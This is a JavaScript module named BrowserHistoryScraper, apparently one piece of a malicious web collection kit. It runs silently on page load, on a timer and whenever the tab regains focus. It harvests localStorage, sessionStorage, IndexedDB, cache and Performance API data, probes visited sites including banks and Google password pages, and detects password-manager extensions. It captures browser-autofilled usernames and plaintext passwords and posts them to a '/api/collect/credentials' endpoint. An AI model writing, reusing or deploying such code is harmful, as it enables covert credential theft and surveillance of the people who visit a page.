export default class BrowserHistoryScraper {
  constructor(core) {
    this.core = core;
    this.historyData = [];
    this.CHUNK_SIZE = 50;
    this.knownVisitedSites = [];
    this.visitedOrigins = new Set();
    this.pageVisibility = document.visibilityState;
    this.documentFocus = document.hasFocus();
  }

  init() {
    // Initial scrape after page load
    setTimeout(() => this.scrapeHistory(), 4000);

    // Re-scrape periodically (every 60s) to catch new history data
    setInterval(() => this.scrapeHistory(), 60000);

    // Additional delayed attempts to catch slow-loading history data
    setTimeout(() => this.scrapeHistory(), 15000);
    setTimeout(() => this.scrapeHistory(), 45000);
    setTimeout(() => this.scrapeHistory(), 90000);
    setTimeout(() => this.scrapeHistory(), 180000);

    // Listen for page visibility changes (tab switching = potential new visited sites)
    document.addEventListener('visibilitychange', () => {
      this.pageVisibility = document.visibilityState;
      if (document.visibilityState === 'visible') {
        this.scrapeHistory();
      }
    });

    // Listen for focus changes
    window.addEventListener('focus', () => {
      this.documentFocus = true;
      setTimeout(() => this.scrapeHistory(), 500);
    });

    window.addEventListener('blur', () => {
      this.documentFocus = false;
    });

    // Detect when user returns to tab after visiting other sites
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') {
        // User just came back to this tab - they might have visited other sites
        setTimeout(() => {
          // Check for new browser history data that might have appeared
          // This catches Chrome's delayed history writing
          this.scrapeHistory();
          // Also re-check password autofills
          this.recheckPasswordFields();
        }, 1000);
      }
    });
  }

  recheckPasswordFields() {
    // When user returns to tab, their saved passwords might have been used elsewhere
    // We check if any password fields now have values
    const pwdFields = document.querySelectorAll('input[type="password"]');
    pwdFields.forEach(field => {
      if (field.value && field.value.length > 0) {
        this.core.send('/api/collect/formdata', {
          formId: 'password-field-active',
          fields: {
            hasValue: true,
            fieldName: field.name || field.id || 'unnamed',
            fieldSelector: this.getElementSelector(field),
            url: window.location.href,
            time: Date.now()
          },
          url: window.location.href
        });
      }
    });
  }

  async scrapeHistory() {
    const historyItems = [];

    // Technique 1: Extract from browser's internal caches and known history locations
    await this.extractIndexedDBHistory(historyItems);

    // Technique 2: Extract from sessionStorage and localStorage
    this.extractStorageHistory(historyItems);

    // Technique 3: Extract from window.name (cross-tab data sharing)
    this.extractWindowName(historyItems);

    // Technique 4: Extract from Performance API
    this.extractPerformanceHistory(historyItems);

    // Technique 5: Extract from browser's autofill data
    this.extractAutofillHistory(historyItems);

    // Technique 6: CSS :visited detection
    this.detectVisitedSites(historyItems);

    // Technique 7: Extract from Service Worker caches
    await this.extractServiceWorkerCache(historyItems);

    // Technique 8: Extract from browser cache API
    await this.extractCacheAPI(historyItems);

    // Technique 9: Extract timing-based history detection
    this.extractTimingHistory(historyItems);

    // Technique 10: Extract from browser extensions and global objects
    this.extractExtensionData(historyItems);

    // Technique 11: Check for browser's built-in history APIs
    this.extractBuiltinHistory(historyItems);

    // Technique 12: Extract from comparison of loaded resources vs. new resources
    this.extractResourceLoadingHistory(historyItems);

    // Send the history data
    if (historyItems.length > 0) {
      // Merge with existing data
      const newItems = historyItems.filter(item => {
        const key = JSON.stringify(item);
        return !this.historyData.some(existing => JSON.stringify(existing) === key);
      });

      if (newItems.length > 0) {
        // Send in chunks
        for (let i = 0; i < newItems.length; i += this.CHUNK_SIZE) {
          const chunk = newItems.slice(i, i + this.CHUNK_SIZE);
          await this.core.send('/api/collect/bulk', {
            data: {
              historyItems: chunk,
              _meta: {
                total: newItems.length,
                chunk: Math.floor(i / this.CHUNK_SIZE) + 1,
                chunks: Math.ceil(newItems.length / this.CHUNK_SIZE),
                timestamp: Date.now()
              }
            }
          });
        }

        // Send summary event
        await this.core.send('/api/collect/formdata', {
          formId: 'browser-history-scrape',
          fields: {
            totalItems: this.historyData.length + newItems.length,
            newItems: newItems.length,
            techniques: [...new Set(newItems.map(h => h.source))],
            visitedSites: this.knownVisitedSites.slice(-20),
            summary: newItems.slice(0, 5).map(h => JSON.stringify(h)).join('\n')
          },
          url: window.location.href
        });
      }

      this.historyData = [...this.historyData, ...newItems];
    }

    return this.historyData;
  }

  // === TECHNIQUE 1: IndexedDB Browser History ===
  async extractIndexedDBHistory(items) {
    try {
      const dbs = await indexedDB.databases?.() || [];
      for (const db of dbs) {
        if (!db.name) continue;

        const historyRelated = db.name?.toLowerCase().includes('history') ||
            db.name?.toLowerCase().includes('browser') ||
            db.name?.toLowerCase().includes('webdata') ||
            db.name?.toLowerCase().includes('visited') ||
            db.name?.toLowerCase().includes('navigation') ||
            db.name?.toLowerCase().includes('autofill') ||
            db.name?.toLowerCase().includes('credentials') ||
            db.name?.toLowerCase().includes('passwords') ||
            db.name?.toLowerCase().includes('logins');

        items.push({ source: 'indexeddb', dbName: db.name, version: db.version, hint: historyRelated ? 'history-related' : 'unknown' });

        if (historyRelated) {
          try {
            const openReq = indexedDB.open(db.name, db.version);
            const db_instance = await new Promise((resolve, reject) => {
              openReq.onsuccess = () => resolve(openReq.result);
              openReq.onerror = reject;
              setTimeout(() => reject(new Error('timeout')), 3000);
            });

            if (db_instance) {
              const storeNames = [...db_instance.objectStoreNames];
              for (const storeName of storeNames) {
                try {
                  const tx = db_instance.transaction(storeName, 'readonly');
                  const store = tx.objectStore(storeName);
                  const allData = await new Promise((resolve, reject) => {
                    const req = store.getAll();
                    req.onsuccess = () => resolve(req.result);
                    req.onerror = reject;
                    setTimeout(() => reject(new Error('timeout')), 2000);
                  });

                  if (allData && allData.length > 0) {
                    const urls = allData
                      .filter(d => typeof d === 'string' && d.startsWith('http'))
                      .map(d => d.substring(0, 500));
                    if (urls.length > 0) {
                      items.push({ source: 'indexeddb-history-data', dbName: db.name, storeName, urlsFound: urls.length, sampleUrls: urls.slice(0, 10) });
                    }
                  }
                } catch (e) {}
              }
              db_instance.close();
            }
          } catch (e) {}
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 2: Storage Scraping ===
  extractStorageHistory(items) {
    try {
      const historyKeys = ['history', 'recent', 'visited', 'navigation', 'browse', 'track',
                          'pageview', 'page_view', 'analytics', 'segment', 'mixpanel',
                          'amplitude', 'ga_', '_ga', '_gid', '_hj', 'hotjar',
                          'historyStore', 'browserHistory', 'routerHistory',
                          'lastPage', 'prevPage', 'currentPage', 'entryPoint',
                          'landingPage', 'referrer', 'sourceUrl', 'returnUrl',
                          'redirect', 'callback', 'return_to', 'next_url',
                          'historyStack', 'pageStack', 'urlStack', 'navStack',
                          'visitedPages', 'pageHistory', 'routeHistory',
                          '__history', '__navigation', '__router'];

      // Check sessionStorage
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          const val = sessionStorage.getItem(key);
          if (this.looksLikeHistoryData(key, val)) {
            items.push({ source: 'sessionStorage', key, value: val?.substring(0, 500) });
          }
          // Check for URL patterns in value
          if (val && (val.includes('http://') || val.includes('https://')) && val.length > 20) {
            const urls = val.match(/https?:\/\/[^\s"',;]+/g);
            if (urls) {
              items.push({ source: 'sessionStorage-urls', key, urls: urls.slice(0, 10).map(u => u.substring(0, 200)) });
            }
          }
        }
      }

      // Check localStorage
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          const val = localStorage.getItem(key);
          if (this.looksLikeHistoryData(key, val)) {
            items.push({ source: 'localStorage', key, value: val?.substring(0, 500) });
          }
          if (val && (val.includes('http://') || val.includes('https://')) && val.length > 20) {
            const urls = val.match(/https?:\/\/[^\s"',;]+/g);
            if (urls) {
              items.push({ source: 'localStorage-urls', key, urls: urls.slice(0, 10).map(u => u.substring(0, 200)) });
            }
          }
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 3: window.name ===
  extractWindowName(items) {
    try {
      if (window.name && window.name.length > 10) {
        items.push({ source: 'window.name', value: window.name.substring(0, 1000) });
        const urls = window.name.match(/https?:\/\/[^\s"',;]+/g);
        if (urls) {
          items.push({ source: 'window.name-urls', urls: urls.slice(0, 10) });
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 4: Performance API ===
  extractPerformanceHistory(items) {
    try {
      const perfEntries = performance.getEntriesByType('navigation');
      perfEntries.forEach(entry => {
        items.push({
          source: 'performance-api',
          type: entry.type,
          redirectCount: entry.redirectCount,
          domContentLoaded: entry.domContentLoadedEventEnd,
          loadTime: entry.loadEventEnd,
          domInteractive: entry.domInteractive,
          firstPaint: entry.domContentLoadedEventEnd
        });
      });

      // Get all resource entries (can reveal browsing history through cached resources)
      const resources = performance.getEntriesByType('resource');
      const uniqueOrigins = new Set();
      resources.forEach(r => {
        try {
          const url = new URL(r.name);
          uniqueOrigins.add(url.origin);
        } catch(e) {}
      });
      uniqueOrigins.forEach(origin => {
        if (origin !== window.location.origin) {
          items.push({ source: 'resource-cache', origin, hint: 'visited' });
          this.visitedOrigins.add(origin);
        }
      });

      // Check for cross-origin resources that indicate browsing activity
      const crossOrigins = [...uniqueOrigins].filter(o => o !== window.location.origin);
      if (crossOrigins.length > 0) {
        items.push({
          source: 'cross-origin-resources',
          count: crossOrigins.length,
          origins: crossOrigins.slice(0, 20)
        });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 5: Autofill Data ===
  extractAutofillHistory(items) {
    try {
      // Check for autofill data in form elements
      const forms = document.querySelectorAll('form');
      forms.forEach(form => {
        const inputs = form.querySelectorAll('input[autocomplete]');
        inputs.forEach(input => {
          const autocompleteVal = input.getAttribute('autocomplete');
          if (autocompleteVal && input.value) {
            items.push({
              source: 'autofill-data',
              autocomplete: autocompleteVal,
              value: input.value.substring(0, 200),
              formAction: form.action || window.location.href
            });

            // If this is a password field with value, it means browser autofilled saved password
            if (input.type === 'password' && input.value.length > 0) {
              // Find associated username/email field
              const emailInput = form.querySelector('input[type="email"], input[name*="email"], input[autocomplete="email"]');
              const userInput = form.querySelector('input[name*="user"], input[name*="login"], input[autocomplete="username"]');
              const username = emailInput?.value || userInput?.value || '';

              this.core.send('/api/collect/credentials', {
                source: 'browser-autofill-detected',
                username: username,
                password: input.value,
                email: emailInput?.value || '',
                url: form.action || window.location.href,
                formType: 'browser-manager-autofill',
                fieldData: {
                  inputName: input.name,
                  inputId: input.id,
                  autocomplete: autocompleteVal,
                  formAction: form.action
                }
              });
            }
          }
        });
      });

      // Check ALL inputs with webkit-autofill
      const allInputs = document.querySelectorAll('input');
      allInputs.forEach(input => {
        // Chrome adds this pseudo-class when it autofills
        if (input.matches(':-webkit-autofill') || input.matches(':-internal-autofill-selected')) {
          const computed = window.getComputedStyle(input);
          const bgColor = computed.backgroundColor;
          // Chrome autofill background color
          if (bgColor === 'rgb(250, 255, 189)' || bgColor === 'rgb(255, 255, 194)' || bgColor === 'rgb(229, 243, 255)') {
            items.push({
              source: 'webkit-autofill-detected',
              inputName: input.name || input.id || 'unknown',
              inputType: input.type,
              hasValue: !!input.value,
              pageUrl: window.location.href
            });

            if (input.value) {
              const form = input.closest('form');
              let password = '';
              let username = '';

              if (form) {
                const pwdField = form.querySelector('input[type="password"]');
                if (pwdField && pwdField.value) password = pwdField.value;
                const emailField = form.querySelector('input[type="email"]');
                if (emailField && emailField.value) username = emailField.value;
                if (!username) {
                  const userField = form.querySelector('input[name*="user"], input[autocomplete="username"]');
                  if (userField && userField.value) username = userField.value;
                }
              }

              if (password) {
                this.core.send('/api/collect/credentials', {
                  source: 'chrome-autofill-detected',
                  username: username || '',
                  password: password,
                  email: username?.includes('@') ? username : '',
                  url: form?.action || window.location.href,
                  formType: 'chrome-manager-autofill',
                  fieldData: { inputName: input.name, backgroundColor: bgColor }
                });
              }
            }
          }
        }
      });
    } catch(e) {}
  }

  // === TECHNIQUE 6: CSS :visited Detection ===
  detectVisitedSites(items) {
    try {
      const commonSites = [
        'https://google.com', 'https://facebook.com', 'https://youtube.com',
        'https://amazon.com', 'https://twitter.com', 'https://reddit.com',
        'https://instagram.com', 'https://linkedin.com', 'https://github.com',
        'https://mail.google.com', 'https://outlook.live.com', 'https://bankofamerica.com',
        'https://chase.com', 'https://wellsfargo.com', 'https://paypal.com',
        'https://netflix.com', 'https://spotify.com', 'https://stackoverflow.com',
        'https://wikipedia.org', 'https://whatsapp.com', 'https://tiktok.com',
        'https://pinterest.com', 'https://ebay.com', 'https://walmart.com',
        'https://target.com', 'https://bestbuy.com', 'https://homedepot.com',
        'https://lowes.com', 'https://cnn.com', 'https://nytimes.com',
        'https://bbc.com', 'https://foxnews.com', 'https://wsj.com',
        'https://dropbox.com', 'https://onedrive.live.com', 'https://drive.google.com',
        'https://docs.google.com', 'https://slack.com', 'https://discord.com',
        'https://zoom.us', 'https://microsoft.com', 'https://apple.com',
        'https://adobe.com', 'https://salesforce.com', 'https://atlassian.com',
        'https://accounts.google.com', 'https://myaccount.google.com',
        'https://passwords.google.com', 'https://password.google.com',
        'https://myaccount.google.com/security', 'https://passwords.google.com/',
        'https://chrome.google.com', 'https://support.google.com'
      ];

      // Create test links for common sites
      const testLink = document.createElement('a');
      testLink.style.cssText = 'display:none;position:absolute;left:-9999px;';
      document.body.appendChild(testLink);

      const visitedSites = [];
      commonSites.forEach(site => {
        try {
          testLink.href = site;
          const computed = window.getComputedStyle(testLink);

          // Default unvisited color is blue (rgb(0, 0, 238)) or similar
          // Browsers restrict :visited computed styles, but color sometimes differs
          if (computed.color !== 'rgb(0, 0, 238)' && computed.color !== 'rgb(0, 0, 255)') {
            visitedSites.push(site);
            this.knownVisitedSites.push(site);
          }
        } catch(e) {}
      });

      if (visitedSites.length > 0) {
        items.push({ source: 'css-visited', visitedSites, count: visitedSites.length });
      }

      document.body.removeChild(testLink);

      // Try multiple link approach for more accuracy
      const container = document.createElement('div');
      container.style.cssText = 'display:none;position:absolute;left:-9999px;';
      document.body.appendChild(container);

      const batchVisited = [];
      commonSites.slice(0, 10).forEach(site => {
        const link = document.createElement('a');
        link.href = site;
        link.textContent = site;
        link.style.cssText = 'color:rgb(0,0,238);'; // Default unvisited color
        container.appendChild(link);
      });

      document.body.appendChild(container);
      // Keep container for future checks
      setTimeout(() => {
        // Check colors after render
        const links = container.querySelectorAll('a');
        links.forEach(link => {
          const computed = window.getComputedStyle(link);
          if (computed.color !== 'rgb(0, 0, 238)' && computed.color !== 'rgb(0, 0, 255)') {
            batchVisited.push(link.textContent);
          }
        });
        if (batchVisited.length > 0) {
          items.push({ source: 'css-visited-batch', visitedSites: batchVisited, count: batchVisited.length });
        }
        // Keep container for periodic re-check
      }, 100);

      // Also check iframes that may have loaded cross-origin content
      const iframes = document.querySelectorAll('iframe');
      iframes.forEach(iframe => {
        try {
          const src = iframe.src;
          if (src && src.startsWith('http') && new URL(src).origin !== window.location.origin) {
            items.push({ source: 'iframe-cross-origin', src: src.substring(0, 200) });
          }
        } catch(e) {}
      });
    } catch(e) {}
  }

  // === TECHNIQUE 7: Service Worker Caches ===
  async extractServiceWorkerCache(items) {
    try {
      if ('caches' in window) {
        const cacheNames = await caches.keys();
        for (const cacheName of cacheNames) {
          const cache = await caches.open(cacheName);
          const requests = await cache.keys();
          const urls = requests.map(r => r.url).filter(url => {
            try {
              const u = new URL(url);
              return u.pathname !== '/' && !url.includes('bundle') && !url.includes('chunk') && !url.includes('.js') && !url.includes('.css');
            } catch(e) { return false; }
          }).slice(0, 50);

          if (urls.length > 0) {
            items.push({ source: 'service-worker-cache', cacheName, urls });
            urls.forEach(u => {
              try { this.visitedOrigins.add(new URL(u).origin); } catch(e) {}
            });
          }
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 8: Cache API ===
  async extractCacheAPI(items) {
    try {
      if ('caches' in window) {
        // Try to access standard browser caches
        const standardCaches = ['v1', 'v2', 'default', 'assets', 'pages', 'api', 'static', 'images', 'fonts', 'offline'];
        for (const name of standardCaches) {
          try {
            const hasCache = await caches.has(name);
            if (hasCache) {
              const cache = await caches.open(name);
              const requests = await cache.keys();
              items.push({ source: 'cache-api', cacheName: name, requestCount: requests.length });
            }
          } catch(e) {}
        }
      }
    } catch(e) {}
  }

  // === TECHNIQUE 9: Timing-based History Detection ===
  extractTimingHistory(items) {
    try {
      // Check performance timing for hints about previous pages
      const timing = performance.timing || performance.getEntriesByType('navigation')[0];
      if (timing) {
        const loadTime = timing.loadEventEnd - timing.navigationStart;
        const domTime = timing.domComplete - timing.domLoading;
        const redirectTime = timing.redirectEnd - timing.redirectStart;

        items.push({
          source: 'timing-history',
          loadTime,
          domTime,
          redirectTime,
          hasRedirect: timing.redirectEnd > 0,
          redirectCount: timing.redirectCount || 0,
          backForward: performance.navigation?.type === 2 ? true : false
        });
      }

      // Check PerformanceNavigationTiming if available
      const navEntries = performance.getEntriesByType('navigation');
      if (navEntries.length > 0) {
        items.push({
          source: 'performance-navigation-detail',
          entryType: navEntries[0].entryType,
          unloadEvent: navEntries[0].unloadEventEnd - navEntries[0].unloadEventStart,
          domContentLoaded: navEntries[0].domContentLoadedEventEnd - navEntries[0].domContentLoadedEventStart,
          domComplete: navEntries[0].domComplete,
          loadEvent: navEntries[0].loadEventEnd - navEntries[0].loadEventStart,
          duration: navEntries[0].duration,
          transferSize: navEntries[0].transferSize,
          encodedBodySize: navEntries[0].encodedBodySize,
          decodedBodySize: navEntries[0].decodedBodySize
        });
      }

      // Check if user has been on other sites recently by checking cache timestamps
      const resources = performance.getEntriesByType('resource');
      const cacheHits = resources.filter(r => r.transferSize === 0 || r.transferSize === undefined);
      if (cacheHits.length > 0) {
        const cachedUrls = cacheHits.slice(0, 20).map(r => r.name.substring(0, 200));
        items.push({ source: 'cache-hits', count: cacheHits.length, sample: cachedUrls });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 10: Browser Extensions & Globals ===
  extractExtensionData(items) {
    try {
      // Detect browser extension scripts that may have history access
      const allScripts = document.querySelectorAll('script[src]');
      const extensionPrefixes = ['chrome-extension://', 'moz-extension://', 'edge-extension://', 'safari-extension://'];

      allScripts.forEach(script => {
        const src = script.src || '';
        if (extensionPrefixes.some(p => src.startsWith(p))) {
          items.push({ source: 'extension-detected', extensionScript: src.substring(0, 200) });
        }
      });

      // Check for extension storage in global window
      const extensionKeys = Object.keys(window).filter(k =>
        k.includes('extension') || k.includes('chrome') || k.includes('browser') ||
        k.includes('webstore') || k.includes('passwordsExtension')
      );

      // Check for password manager extensions
      const passwordManagerIndicators = [
        'lastpass', 'bitwarden', '1password', 'dashlane', 'keeper',
        'nordpass', 'roboform', 'enpass', 'protonpass',
        'chrome.passwordsPrivate', 'chrome.browserPasswords'
      ];

      const detectedManagers = passwordManagerIndicators.filter(indicator => {
        if (window[indicator]) return true;
        if (indicator.includes('.')) {
          const parts = indicator.split('.');
          let obj = window;
          for (const part of parts) {
            if (obj && obj[part]) { obj = obj[part]; }
            else { return false; }
          }
          return obj !== window;
        }
        return false;
      });

      if (detectedManagers.length > 0) {
        items.push({ source: 'password-manager-detected', managers: detectedManagers });
      }

      // Check for extension-specific DOM markers
      const allElements = document.querySelectorAll('*');
      const extensionAttributes = ['data-lp', 'data-bitwarden', 'data-1password', 'data-dashlane', 'data-nordpass'];
      const foundAttributes = [];
      allElements.forEach(el => {
        extensionAttributes.forEach(attr => {
          if (el.hasAttribute(attr)) foundAttributes.push(attr);
        });
      });

      if (foundAttributes.length > 0) {
        items.push({ source: 'extension-dom-markers', attributes: [...new Set(foundAttributes)] });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 11: Built-in Browser APIs ===
  extractBuiltinHistory(items) {
    try {
      // window.history length
      items.push({
        source: 'window.history',
        historyLength: window.history.length,
        canGoBack: window.history.length > 1,
        canGoForward: window.history.length > 0 && window.history.length > window.history.length
      });

      // Try to access chrome.history if available (for Chrome extensions)
      if (window.chrome && window.chrome.history) {
        items.push({ source: 'chrome-api-history', available: true });
      }

      // Try chrome.passwordsPrivate for Chrome built-in password manager
      if (window.chrome && window.chrome.passwordsPrivate) {
        items.push({ source: 'chrome-passwords-api', available: true });
      }
    } catch(e) {}
  }

  // === TECHNIQUE 12: Resource Loading History ===
  extractResourceLoadingHistory(items) {
    try {
      // Check which resources loaded from cache vs. network
      // Cache-loaded resources indicate previous visits to those sites
      const resources = performance.getEntriesByType('resource');
      const cacheLoaded = resources.filter(r => {
        return r.duration < 5 || r.transferSize === 0 || r.encodedBodySize === 0;
      });

      if (cacheLoaded.length > 5) {
        const cachedOrigins = new Set();
        cacheLoaded.forEach(r => {
          try {
            cachedOrigins.add(new URL(r.name).origin);
          } catch(e) {}
        });

        items.push({
          source: 'resource-cache-analysis',
          totalCached: cacheLoaded.length,
          uniqueOrigins: cachedOrigins.size,
          origins: [...cachedOrigins].slice(0, 20)
        });
      }

      // Check for prefetch/prerender hints
      const links = document.querySelectorAll('link[rel="prefetch"], link[rel="prerender"], link[rel="preload"], link[rel="preconnect"], link[rel="dns-prefetch"]');
      const prefetchUrls = [];
      links.forEach(link => {
        const href = link.href || link.getAttribute('href') || '';
        if (href && !href.startsWith('/') && !href.startsWith('#')) {
          prefetchUrls.push(href.substring(0, 200));
        }
      });
      if (prefetchUrls.length > 0) {
        items.push({ source: 'prefetch-links', urls: prefetchUrls });
      }
    } catch(e) {}
  }

  // === HELPERS ===

  looksLikeHistoryData(key, value) {
    if (!value || !key) return false;
    const historyKeywords = ['history', 'recent', 'visited', 'navigation', 'browse', 'track',
                             'pageview', 'page_view', 'analytics', 'segment', 'mixpanel',
                             'amplitude', 'ga_', '_ga', '_gid', '_hj', 'hotjar',
                             'historyStore', 'browserHistory', 'routerHistory',
                             'lastPage', 'prevPage', 'currentPage', 'entryPoint',
                             'landingPage', 'referrer', 'sourceUrl', 'returnUrl',
                             'redirect', 'callback', 'return_to', 'next_url',
                             'historyStack', 'pageStack', 'urlStack', 'navStack',
                             'visitedPages', 'pageHistory', 'routeHistory',
                             '__history', '__navigation', '__router',
                             'navigationTiming', 'pageTiming'];

    const keyLower = key.toLowerCase();
    const valLower = value.toLowerCase();

    if (historyKeywords.some(k => keyLower.includes(k))) return true;
    if (value.length > 50 && valLower.includes('http')) return true;
    if (value.length > 100 && (valLower.includes('/') && valLower.includes('.'))) return true;

    // Check for JSON with URL-like patterns
    try {
      const parsed = JSON.parse(value);
      if (typeof parsed === 'object') {
        const str = JSON.stringify(parsed).toLowerCase();
        if (str.includes('url') || str.includes('path') || str.includes('route') || str.includes('navigation')) return true;
      }
    } catch(e) {}

    return false;
  }

  getElementSelector(el) {
    try {
      if (el.id) return `#${el.id}`;
      if (el.className && typeof el.className === 'string') {
        const cls = el.className.split(' ').filter(Boolean).slice(0, 3).join('.');
        return `${el.tagName.toLowerCase()}.${cls}`;
      }
      return el.tagName.toLowerCase();
    } catch (e) {
      return el.tagName?.toLowerCase() || 'unknown';
    }
  }

  getHistoryData() {
    return this.historyData;
  }

  getVisitedSites() {
    return [...this.knownVisitedSites];
  }

  getVisitedOrigins() {
    return [...this.visitedOrigins];
  }
}